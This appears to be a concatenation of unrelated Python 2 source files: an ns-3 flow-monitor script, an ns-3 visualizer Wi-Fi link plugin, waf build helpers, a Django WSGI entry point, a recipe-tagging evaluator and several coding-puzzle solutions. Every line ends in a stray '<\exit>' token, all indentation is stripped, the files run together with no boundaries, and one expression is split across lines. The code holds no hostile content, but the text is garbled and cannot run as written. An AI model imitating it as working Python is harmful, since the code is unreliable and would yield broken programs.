monitor.CheckForLostPackets()<\exit>
classifier = flowmon_helper.GetClassifier()<\exit>
if cmd.Results is None:<\exit>
for flow_id, flow_stats in monitor.GetFlowStats():<\exit>
t = classifier.FindFlow(flow_id)<\exit>
proto = {6: 'TCP', 17: 'UDP'} [t.protocol]<\exit>
print "FlowID: %i (%s %s/%s --> %s/%i)" % \<\exit>
(flow_id, proto, t.sourceAddress, t.sourcePort, t.destinationAddress, t.destinationPort)<\exit>
print_stats(sys.stdout, flow_stats)<\exit>
else:<\exit>
print monitor.SerializeToXmlFile(cmd.Results, True, True)<\exit>
if cmd.Plot is not None:<\exit>
import pylab<\exit>
delays = []<\exit>
for flow_id, flow_stats in monitor.GetFlowStats():<\exit>
tupl = classifier.FindFlow(flow_id)<\exit>
if tupl.protocol == 17 and tupl.sourcePort == 698:<\exit>
continue<\exit>
delays.append(flow_stats.delaySum.GetSeconds() / flow_stats.rxPackets)<\exit>
pylab.hist(delays, 20)<\exit>
pylab.xlabel("Delay (s)")<\exit>
pylab.ylabel("Number of Flows")<\exit>
pylab.show()<\exit>
return 0<\exit>
if __name__ == '__main__':<\exit>
sys.exit(main(sys.argv))<\exit>
import math<\exit>
import ns.wifi<\exit>
import ns.network<\exit>
import goocanvas<\exit>
from visualizer.base import Link, transform_distance_canvas_to_simulation<\exit>
class WifiLink(Link):<\exit>
def __init__(self, parent_canvas_item, sta, dev):<\exit>
self.node1 = sta<\exit>
self.dev = dev<\exit>
self.node2 = None<\exit>
self.canvas_item = goocanvas.Group(parent=parent_canvas_item)<\exit>
self.invisible_line = goocanvas.Polyline(parent=self.canvas_item,<\exit>
line_width=25.0,<\exit>
visibility=goocanvas.ITEM_HIDDEN)<\exit>
self.visible_line = goocanvas.Polyline(parent=self.canvas_item,<\exit>
line_width=1.0,<\exit>
stroke_color_rgba=0xC00000FF,<\exit>
line_dash=goocanvas.LineDash([2.0, 2.0 ]))<\exit>
self.invisible_line.props.pointer_events = (goocanvas.EVENTS_STROKE_MASK<\exit>
|goocanvas.EVENTS_FILL_MASK<\exit>
|goocanvas.EVENTS_PAINTED_MASK)<\exit>
self.canvas_item.set_data("pyviz-object", self)<\exit>
self.canvas_item.lower(None)<\exit>
self.set_ap(None)<\exit>
def set_ap(self, ap):<\exit>
if ap is self.node2:<\exit>
return<\exit>
if self.node2 is not None:<\exit>
self.node2.remove_link(self)<\exit>
self.node2 = ap<\exit>
if self.node2 is None:<\exit>
self.canvas_item.set_property("visibility", goocanvas.ITEM_HIDDEN)<\exit>
else:<\exit>
self.node2.add_link(self)<\exit>
self.canvas_item.set_property("visibility", goocanvas.ITEM_VISIBLE)<\exit>
self.update_points()<\exit>
def update_points(self):<\exit>
if self.node2 is None:<\exit>
return<\exit>
pos1_x, pos1_y = self.node1.get_position()<\exit>
pos2_x, pos2_y = self.node2.get_position()<\exit>
points = goocanvas.Points([(pos1_x, pos1_y), (pos2_x, pos2_y)])<\exit>
self.visible_line.set_property("points", points)<\exit>
self.invisible_line.set_property("points", points)<\exit>
def destroy(self):<\exit>
self.canvas_item.destroy()<\exit>
self.node1 = None<\exit>
self.node2 = None<\exit>
def tooltip_query(self, tooltip):<\exit>
pos1_x, pos1_y = self.node1.get_position()<\exit>
pos2_x, pos2_y = self.node2.get_position()<\exit>
dx = pos2_x - pos1_x<\exit>
dy = pos2_y - pos1_y<\exit>
d = transform_distance_canvas_to_simulation(math.sqrt(dx*dx + dy*dy))<\exit>
mac = self.dev.GetMac()<\exit>
tooltip.set_text(("WiFi link between STA Node %i and AP Node %i; distance=%.2f m.\n"<\exit>
"SSID: %s\n"<\exit>
"BSSID: %s")<\exit>
% (self.node1.node_index, self.node2.node_index, d,<\exit>
mac.GetSsid(), mac.GetBssid()))<\exit>
class WifiLinkMonitor(object):<\exit>
def __init__(self, dummy_viz):<\exit>
self.access_points = {}<\exit>
self.stations = []<\exit>
def scan_nodes(self, viz):<\exit>
for (sta_netdevice, viz_node, wifi_link) in self.stations:<\exit>
wifi_link.destroy()<\exit>
self.access_points = {}<\exit>
self.stations = []<\exit>
for node in viz.nodes.itervalues():<\exit>
ns3_node = ns.network.NodeList.GetNode(node.node_index)<\exit>
for devI in range(ns3_node.GetNDevices()):<\exit>
dev = ns3_node.GetDevice(devI)<\exit>
if not isinstance(dev, ns.wifi.WifiNetDevice):<\exit>
continue<\exit>
wifi_mac = dev.GetMac()<\exit>
if isinstance(wifi_mac, ns.wifi.StaWifiMac):<\exit>
wifi_link = WifiLink(viz.links_group, node, dev)<\exit>
self.stations.append((dev, node, wifi_link))<\exit>
elif isinstance(wifi_mac, ns.wifi.ApWifiMac):<\exit>
bssid = ns.network.Mac48Address.ConvertFrom(dev.GetAddress())<\exit>
self.access_points[str(bssid)] = node<\exit>
def simulation_periodic_update(self, viz):<\exit>
for (sta_netdevice, viz_node, wifi_link) in self.stations:<\exit>
if not sta_netdevice.IsLinkUp():<\exit>
wifi_link.set_ap(None)<\exit>
continue<\exit>
bssid = str(sta_netdevice.GetMac().GetBssid())<\exit>
if bssid == '00:00:00:00:00:00':<\exit>
wifi_link.set_ap(None)<\exit>
continue<\exit>
ap = self.access_points[bssid]<\exit>
wifi_link.set_ap(ap)<\exit>
def update_view(self, viz):<\exit>
for (dummy_sta_netdevice, dummy_viz_node, wifi_link) in self.stations:<\exit>
if wifi_link is not None:<\exit>
wifi_link.update_points()<\exit>
def register(viz):<\exit>
link_monitor = WifiLinkMonitor(viz)<\exit>
viz.connect("simulation-periodic-update", link_monitor.simulation_periodic_update)<\exit>
viz.connect("update-view", link_monitor.update_view)<\exit>
viz.connect("topology-scanned", link_monitor.scan_nodes)<\exit>
class Solution:<\exit>
def woodCut(self, L, k):<\exit>
if not L:<\exit>
return 0<\exit>
maxa = max(L)<\exit>
lo = 0<\exit>
hi = maxa+1<\exit>
while lo < hi:<\exit>
m = (lo+hi)/2<\exit>
if m == 0:<\exit>
return m<\exit>
cnt = 0<\exit>
for l in L:<\exit>
cnt += l/m<\exit>
if cnt >= k:<\exit>
lo = m+1<\exit>
else:<\exit>
hi = m<\exit>
return lo-1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().woodCut([2147483644, 2147483645, 2147483646, 2147483647], 4) == 2147483644<\exit>
class TrieNode(object):<\exit>
def __init__(self, char):<\exit>
self.char = char<\exit>
self.word = None<\exit>
self.children = {}<\exit>
def __repr__(self):<\exit>
return repr(self.char)<\exit>
class Trie(object):<\exit>
def __init__(self):<\exit>
self.root = TrieNode(None)<\exit>
def add(self, word):<\exit>
word = word.lower()<\exit>
cur = self.root<\exit>
for c in word:<\exit>
if c not in cur.children:<\exit>
cur.children[c] = TrieNode(c)<\exit>
cur = cur.children[c]<\exit>
cur.word = word<\exit>
class Solution:<\exit>
directions = [(0, 1), (0, -1), (-1, 0), (1, 0)]<\exit>
def wordSearchII_TLE(self, board, words):<\exit>
trie = Trie()<\exit>
for word in words:<\exit>
trie.add(word)<\exit>
ret = set()<\exit>
visited = set()<\exit>
for i in xrange(len(board)):<\exit>
for j in xrange(len(board[0])):<\exit>
self.dfs(board, i, j, trie.root, visited, ret)<\exit>
return list(ret)<\exit>
def dfs(self, board, i, j, parent, visited, ret):<\exit>
c = board[i][j]<\exit>
visited.add((i, j))<\exit>
if c in parent.children:<\exit>
cur = parent.children[c]<\exit>
if cur.word:<\exit>
ret.add(cur.word)<\exit>
for direction in Solution.directions:<\exit>
row = i+direction[0]<\exit>
col = j+direction[1]<\exit>
if 0 <= row < len(board) and 0 <= col < len(board[0]) and (row, col) not in visited:<\exit>
self.dfs(board, row, col, cur, visited, ret)<\exit>
visited.remove((i, j))<\exit>
def wordSearchII(self, board, words):<\exit>
ret = []<\exit>
for word in words:<\exit>
trie = Trie()<\exit>
trie.add(word)<\exit>
visited = set()<\exit>
r = set()<\exit>
found = False<\exit>
for i in xrange(len(board)):<\exit>
if not found:<\exit>
for j in xrange(len(board[0])):<\exit>
self.dfs2(board, i, j, trie.root, visited, r)<\exit>
if len(r) == 1:<\exit>
ret.append(r.pop())<\exit>
found = True<\exit>
break<\exit>
return ret<\exit>
def dfs2(self, board, i, j, parent, visited, ret):<\exit>
c = board[i][j]<\exit>
visited.add((i, j))<\exit>
if c in parent.children:<\exit>
cur = parent.children[c]<\exit>
if cur.word:<\exit>
ret.add(cur.word)<\exit>
for direction in Solution.directions:<\exit>
row = i+direction[0]<\exit>
col = j+direction[1]<\exit>
if 0 <= row < len(board) and 0 <= col < len(board[0]) and (row, col) not in visited and not ret:<\exit>
self.dfs2(board, row, col, cur, visited, ret)<\exit>
visited.remove((i, j))<\exit>
if __name__ == "__main__":<\exit>
board = ["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",<\exit>
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",<\exit>
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",<\exit>
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",<\exit>
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",<\exit>
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",<\exit>
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",<\exit>
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",<\exit>
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaab"]<\exit>
words = {"baaaaaaaaaaaaa", "a", "aa", "aaaa", "aaaax", "abaaabbaz"}<\exit>
assert Solution().wordSearchII(board, words) == ['a', 'aa', 'aaaa', 'baaaaaaaaaaaaa']<\exit>
import os<\exit>
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "tagr.settings")<\exit>
from django.core.wsgi import get_wsgi_application<\exit>
from whitenoise.django import DjangoWhiteNoise<\exit>
application = get_wsgi_application()<\exit>
application = DjangoWhiteNoise(application)<\exit>
import os<\exit>
import os.path<\exit>
import sys<\exit>
import subprocess<\exit>
import shlex<\exit>
import Options<\exit>
import Utils<\exit>
import Logs<\exit>
import TaskGen<\exit>
import Build<\exit>
import re<\exit>
from waflib.Errors import WafError<\exit>
APPNAME=None<\exit>
VERSION=None<\exit>
bld=None<\exit>
def get_command_template(env, arguments=()):<\exit>
cmd = Options.options.command_template or '%s'<\exit>
for arg in arguments:<\exit>
cmd = cmd + " " + arg<\exit>
return cmd<\exit>
if hasattr(os.path, "relpath"):<\exit>
relpath = os.path.relpath<\exit>
else:<\exit>
def relpath(path, start=os.path.curdir):<\exit>
if not path:<\exit>
raise ValueError("no path specified")<\exit>
start_list = os.path.abspath(start).split(os.path.sep)<\exit>
path_list = os.path.abspath(path).split(os.path.sep)<\exit>
i = len(os.path.commonprefix([start_list, path_list]))<\exit>
rel_list = [os.path.pardir] * (len(start_list)-i) + path_list[i:]<\exit>
if not rel_list:<\exit>
return os.path.curdir<\exit>
return os.path.join(*rel_list)<\exit>
from waflib import Context<\exit>
def find_program(program_name, env):<\exit>
launch_dir = os.path.abspath(Context.launch_dir)<\exit>
found_programs = []<\exit>
for obj in bld.all_task_gen:<\exit>
if not getattr(obj, 'is_ns3_program', False):<\exit>
continue<\exit>
if not (obj.path.abspath().startswith(launch_dir)<\exit>
or obj.path.abspath(env).startswith(launch_dir)):<\exit>
continue<\exit>
name1 = obj.target<\exit>
name2 = os.path.join(relpath(obj.path.abspath(), launch_dir), obj.target)<\exit>
names = [name1, name2]<\exit>
found_programs.extend(names)<\exit>
if program_name in names:<\exit>
return obj<\exit>
raise ValueError("program '%s' not found; available programs are: %r"<\exit>
% (program_name, found_programs))<\exit>
def get_proc_env(os_env=None):<\exit>
env = bld.env<\exit>
if sys.platform == 'linux2':<\exit>
pathvar = 'LD_LIBRARY_PATH'<\exit>
elif sys.platform == 'darwin':<\exit>
pathvar = 'DYLD_LIBRARY_PATH'<\exit>
elif sys.platform == 'win32':<\exit>
pathvar = 'PATH'<\exit>
elif sys.platform == 'cygwin':<\exit>
pathvar = 'PATH'<\exit>
elif sys.platform.startswith('freebsd'):<\exit>
pathvar = 'LD_LIBRARY_PATH'<\exit>
else:<\exit>
Logs.warn(("Don't know how to configure "<\exit>
"dynamic library path for the platform %r;"<\exit>
" assuming it's LD_LIBRARY_PATH.") % (sys.platform,))<\exit>
pathvar = 'LD_LIBRARY_PATH'<\exit>
proc_env = dict(os.environ)<\exit>
if os_env is not None:<\exit>
proc_env.update(os_env)<\exit>
if pathvar is not None:<\exit>
if pathvar in proc_env:<\exit>
proc_env[pathvar] = os.pathsep.join(list(env['NS3_MODULE_PATH']) + [proc_env[pathvar]])<\exit>
else:<\exit>
proc_env[pathvar] = os.pathsep.join(list(env['NS3_MODULE_PATH']))<\exit>
pymoddir = bld.path.find_dir('bindings/python').get_bld().abspath()<\exit>
pyvizdir = bld.path.find_dir('src/visualizer').abspath()<\exit>
if 'PYTHONPATH' in proc_env:<\exit>
proc_env['PYTHONPATH'] = os.pathsep.join([pymoddir, pyvizdir] + [proc_env['PYTHONPATH']])<\exit>
else:<\exit>
proc_env['PYTHONPATH'] = os.pathsep.join([pymoddir, pyvizdir])<\exit>
if 'PATH' in proc_env:<\exit>
proc_env['PATH'] = os.pathsep.join(list(env['NS3_EXECUTABLE_PATH']) + [proc_env['PATH']])<\exit>
else:<\exit>
proc_env['PATH'] = os.pathsep.join(list(env['NS3_EXECUTABLE_PATH']))<\exit>
return proc_env<\exit>
def run_argv(argv, env, os_env=None, cwd=None, force_no_valgrind=False):<\exit>
proc_env = get_proc_env(os_env)<\exit>
if Options.options.valgrind and not force_no_valgrind:<\exit>
if Options.options.command_template:<\exit>
raise WafError("Options --command-template and --valgrind are conflicting")<\exit>
if not env['VALGRIND']:<\exit>
raise WafError("valgrind is not installed")<\exit>
argv = [env['VALGRIND'], "--leak-check=full", "--show-reachable=yes", "--error-exitcode=1"] + argv<\exit>
proc = subprocess.Popen(argv, env=proc_env, cwd=cwd, stderr=subprocess.PIPE)<\exit>
error = False<\exit>
for line in proc.stderr:<\exit>
sys.stderr.write(line)<\exit>
if "== LEAK SUMMARY" in line:<\exit>
error = True<\exit>
retval = proc.wait()<\exit>
if retval == 0 and error:<\exit>
retval = 1<\exit>
else:<\exit>
try:<\exit>
WindowsError<\exit>
except NameError:<\exit>
retval = subprocess.Popen(argv, env=proc_env, cwd=cwd).wait()<\exit>
else:<\exit>
try:<\exit>
retval = subprocess.Popen(argv, env=proc_env, cwd=cwd).wait()<\exit>
except WindowsError, ex:<\exit>
raise WafError("Command %s raised exception %s" % (argv, ex))<\exit>
if retval:<\exit>
signame = None<\exit>
if retval < 0:<\exit>
import signal<\exit>
for name, val in vars(signal).iteritems():<\exit>
if len(name) > 3 and name[:3] == 'SIG' and name[3] != '_':<\exit>
if val == -retval:<\exit>
signame = name<\exit>
break<\exit>
if signame:<\exit>
raise WafError("Command %s terminated with signal %s."<\exit>
" Run it under a debugger to get more information "<\exit>
"(./waf --run <program> --command-template=\"gdb --args %%s <args>\")." % (argv, signame))<\exit>
else:<\exit>
raise WafError("Command %s exited with code %i" % (argv, retval))<\exit>
return retval<\exit>
def get_run_program(program_string, command_template=None):<\exit>
env = bld.env<\exit>
if command_template in (None, '%s'):<\exit>
argv = shlex.split(program_string)<\exit>
program_name = argv[0]<\exit>
try:<\exit>
program_obj = find_program(program_name, env)<\exit>
except ValueError, ex:<\exit>
raise WafError(str(ex))<\exit>
program_node = program_obj.path.find_or_declare(program_obj.target)<\exit>
execvec = [program_node.abspath()] + argv[1:]<\exit>
else:<\exit>
program_name = program_string<\exit>
try:<\exit>
program_obj = find_program(program_name, env)<\exit>
except ValueError, ex:<\exit>
raise WafError(str(ex))<\exit>
program_node = program_obj.path.find_or_declare(program_obj.target)<\exit>
tmpl = command_template % (program_node.abspath(),)<\exit>
execvec = shlex.split(tmpl.replace('\\', '\\\\'))<\exit>
return program_name, execvec<\exit>
def run_program(program_string, env, command_template=None, cwd=None, visualize=False):<\exit>
dummy_program_name, execvec = get_run_program(program_string, command_template)<\exit>
if cwd is None:<\exit>
if (Options.options.cwd_launch):<\exit>
cwd = Options.options.cwd_launch<\exit>
else:<\exit>
cwd = Options.cwd_launch<\exit>
if visualize:<\exit>
execvec.append("--SimulatorImplementationType=ns3::VisualSimulatorImpl")<\exit>
return run_argv(execvec, env, cwd=cwd)<\exit>
def run_python_program(program_string, env, visualize=False):<\exit>
env = bld.env<\exit>
execvec = shlex.split(program_string)<\exit>
if (Options.options.cwd_launch):<\exit>
cwd = Options.options.cwd_launch<\exit>
else:<\exit>
cwd = Options.cwd_launch<\exit>
if visualize:<\exit>
execvec.append("--SimulatorImplementationType=ns3::VisualSimulatorImpl")<\exit>
return run_argv([env['PYTHON'][0]] + execvec, env, cwd=cwd)<\exit>
def monkey_patch_Runner_start():<\exit>
from waflib import Task<\exit>
def start(self):<\exit>
self.total = self.bld.total()<\exit>
while not self.stop:<\exit>
self.refill_task_list()<\exit>
tsk = self.get_next_task()<\exit>
if not tsk:<\exit>
if self.count:<\exit>
continue<\exit>
else:<\exit>
break<\exit>
if tsk.hasrun:<\exit>
self.processed += 1<\exit>
continue<\exit>
if self.stop:<\exit>
break<\exit>
try:<\exit>
st = tsk.runnable_status()<\exit>
except Exception:<\exit>
self.processed += 1<\exit>
if not self.stop and self.bld.keep:<\exit>
tsk.hasrun = Task.SKIPPED<\exit>
if self.bld.keep == 1:<\exit>
self.stop = True<\exit>
continue<\exit>
tsk.err_msg = Utils.ex_stack()<\exit>
tsk.hasrun = Task.EXCEPTION<\exit>
self.error_handler(tsk)<\exit>
continue<\exit>
if st == Task.ASK_LATER:<\exit>
self.postpone(tsk)<\exit>
elif st == Task.SKIP_ME:<\exit>
self.processed += 1<\exit>
tsk.hasrun = Task.SKIPPED<\exit>
self.add_more_tasks(tsk)<\exit>
else:<\exit>
tsk.position = (self.processed, self.total)<\exit>
self.count += 1<\exit>
tsk.master = self<\exit>
self.processed += 1<\exit>
if self.numjobs == 1:<\exit>
tsk.process()<\exit>
else:<\exit>
self.add_task(tsk)<\exit>
while self.error and self.count:<\exit>
self.get_out()<\exit>
assert (self.count == 0 or self.stop)<\exit>
self.free_task_pool()<\exit>
from waflib.Runner import Parallel<\exit>
Parallel.start = start<\exit>
import os<\exit>
import re<\exit>
entities = ['Ingredient','Amount','Unit','Recipe']<\exit>
auto_tag_set = []<\exit>
nonauto_tag_set = []<\exit>
def init_dict(dictOfdict):<\exit>
for e in entities:<\exit>
if not (e in dictOfdict):<\exit>
dictOfdict[e] = dict()<\exit>
def get_xml_content(file_path):<\exit>
f = open(file_path)<\exit>
content = f.read()<\exit>
content = pre_format(content)<\exit>
return get_xml_entity(content)<\exit>
def get_ann_content(file_path):<\exit>
f = open(file_path)<\exit>
content = f.read()<\exit>
return get_ann_entity(content)<\exit>
def process_files_in_dir(dir):<\exit>
dir = os.path.dirname(os.path.realpath(__file__)) + ('/'+dir)<\exit>
for root, dirs, files in os.walk(dir):<\exit>
for file in sorted(files):<\exit>
if(file.endswith('.xml')):<\exit>
auto_tag_set.append(get_xml_content(os.path.join(root,file)))<\exit>
if(file.endswith('.ann')):<\exit>
nonauto_tag_set.append(get_ann_content(os.path.join(root,file)))<\exit>
def get_ann_entity(content):<\exit>
entity_dict = dict()<\exit>
init_dict(entity_dict)<\exit>
content = content.split('\n')<\exit>
for line in content:<\exit>
token = line.split('\t')<\exit>
if("T" in token[0]):<\exit>
tag_name = token[1].split(' ')[0]<\exit>
if(token[2] in entity_dict[tag_name]):<\exit>
entity_dict[tag_name][token[2]] += 1<\exit>
else:<\exit>
entity_dict[tag_name][token[2]] = 1<\exit>
return entity_dict<\exit>
def get_xml_entity(content):<\exit>
entity_dict = dict()<\exit>
init_dict(entity_dict)<\exit>
for e in entities:<\exit>
e_reg = re.compile('<'+e + '>(?P<'+e+'>[^<]+)</'+e+'>');<\exit>
for i in e_reg.findall(content):<\exit>
if(i in entity_dict[e]):<\exit>
entity_dict[e][i] += 1<\exit>
else:<\exit>
entity_dict[e][i] = 1<\exit>
return entity_dict<\exit>
def pre_format(content):<\exit>
content = re.sub("<entity type=\"(\w+)\">([^<]+)</entity>", "<\g<1>>\g<2></\g<1>>", content)<\exit>
content = content.replace("<s>", "")<\exit>
content = content.replace("</B-Ingredient> <I-Ingredient>", " ")<\exit>
content = content.replace("</I-Ingredient> <I-Ingredient>", " ")<\exit>
content = content.replace("</B-Recipe> <I-Recipe>", " ")<\exit>
content = content.replace("</I-Recipe> <I-Recipe>", " ")<\exit>
content = content.replace("</B-Amount> <I-Amount>", " ")<\exit>
content = content.replace("</I-Amount> <I-Amount>", " ")<\exit>
content = content.replace("</B-Unit> <I-Unit>", " ")<\exit>
content = content.replace("</I-Unit> <I-Unit>", " ")<\exit>
content = content.replace("</I-", "</")<\exit>
content = content.replace("</B-", "</")<\exit>
content = content.replace("<B-", "<")<\exit>
content = content.replace("<I-", "<")<\exit>
return content<\exit>
def calc_diff_by_entity(nonauto_tag_set,auto_tag_set):<\exit>
diff_matrix = dict()<\exit>
init_dict(diff_matrix)<\exit>
for key, value in diff_matrix.iteritems():<\exit>
value['FP'] = 0<\exit>
value['TP'] = 0<\exit>
value['FN'] = 0<\exit>
for article in zip(nonauto_tag_set,auto_tag_set):<\exit>
for entity in entities:<\exit>
for key, value in article[0][entity].iteritems():<\exit>
if key in article[1][entity]:<\exit>
if article[1][entity][key] - value > 0:<\exit>
diff_matrix[entity]['FP'] += (article[1][entity][key] - value)<\exit>
else:<\exit>
diff_matrix[entity]['FN'] += (value - article[1][entity][key])<\exit>
diff_matrix[entity]['TP'] += min(article[1][entity][key],value)<\exit>
else:<\exit>
diff_matrix[entity]['FN'] += value<\exit>
for key, value in article[1][entity].iteritems():<\exit>
if not key in article[0][entity]:<\exit>
diff_matrix[entity]['FP'] += value<\exit>
return diff_matrix<\exit>
process_files_in_dir('tagged_data')<\exit>
confusion_matrix = calc_diff_by_entity(nonauto_tag_set,auto_tag_set)<\exit>
for key, value in confusion_matrix.iteritems():<\exit>
if value['TP'] == 0:<\exit>
precision = 0<\exit>
recall = 0<\exit>
f_measure = 0<\exit>
else:<\exit>
precision = 1.0 * value['TP'] / (value['TP'] + value['FP'])<\exit>
recall = 1.0 * value['TP'] / (value['TP'] + value['FN'])<\exit>
f_measure = 2.0 * (precision * recall)/(precision + recall)<\exit>
print key+':\tPrecision-'+str("{0:.4f}".format(precision))+'\tRecall-'+str("{0:.4f}".format(recall))+'\tF-measure-'+str("{0:.4f}".format(f_measure))<\exit>
MOD = 10 ** 9 + 7<\exit>
BIT_CNT = 10 ** 5<\exit>
SHIFT_CNT = 314159<\exit>
N = BIT_CNT + SHIFT_CNT<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
a, b = cipher<\exit>
len_a = len(a)<\exit>
len_b = len(b)<\exit>
a_array = [0 for _ in xrange(N)]<\exit>
b_array = [0 for _ in xrange(N)]<\exit>
for ind, val in enumerate(a):<\exit>
a_array[len_a - 1 - ind] = int(val)<\exit>
for ind, val in enumerate(b):<\exit>
b_array[len_b - 1 - ind] = int(val)<\exit>
dp = [[0, 0] for _ in xrange(N + 1)]<\exit>
for i in xrange(1, N + 1):<\exit>
dp[i][0] = dp[i - 1][0] + 1 if b_array[i - 1] == 0 else dp[i - 1][0]<\exit>
dp[i][1] = dp[i - 1][1] + 1 if b_array[i - 1] == 1 else dp[i - 1][1]<\exit>
result = 0<\exit>
sig = 1<\exit>
for i in xrange(N):<\exit>
if i < SHIFT_CNT:<\exit>
cnt_zero = dp[i + 1][0] + SHIFT_CNT - i<\exit>
cnt_one = dp[i + 1][1]<\exit>
else:<\exit>
cnt_zero = dp[len_b][0] - dp[i - SHIFT_CNT][0] + SHIFT_CNT<\exit>
cnt_one = dp[len_b][1] - dp[i - SHIFT_CNT][1]<\exit>
cur_bit_sum = (a_array[<\exit>
i] ^ 0) * cnt_zero<\exit>
cur_bit_sum += (a_array[i] ^ 1) * cnt_one<\exit>
result = (result + sig * cur_bit_sum) % MOD<\exit>
sig = (sig * 2) % MOD<\exit>
return result<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
a = f.readline().strip()<\exit>
b = f.readline().strip()<\exit>
cipher = (a, b)<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
length, lst = cipher<\exit>
return reduce(lambda x, y: x | y, lst) * 2 ** (length - 1) % (10 ** 9 + 7)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
length = int(f.readline().strip())<\exit>
lst = map(lambda x: int(x), f.readline().strip().split(" "))<\exit>
cipher = [length, lst]<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
